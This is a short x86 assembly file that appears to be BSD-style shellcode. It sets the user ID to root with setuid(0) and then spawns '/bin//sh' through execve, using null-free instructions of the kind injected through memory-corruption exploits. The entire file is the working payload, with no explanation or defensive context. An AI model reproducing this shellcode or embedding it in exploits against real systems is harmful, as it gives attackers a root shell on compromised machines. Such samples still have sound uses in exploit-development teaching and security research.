global	_start

_start:
	; fall through..

_setuid:
	xor	dword eax, eax
	push	dword eax
	push	dword eax
	mov	al, 23
	int	0x80

_shell:
	xor	dword eax, eax
	push	dword eax
	push	dword 0x68732f2f
	push	dword 0x6e69622f
	mov	ebx, esp
	push	dword eax
	push	dword esp
	push	dword ebx
	push	dword eax
	mov	al, 0x3b
	int	0x80

_exit:
	xor	dword eax, eax
	push	dword eax
	mov	al, 0x01
	int	0x80
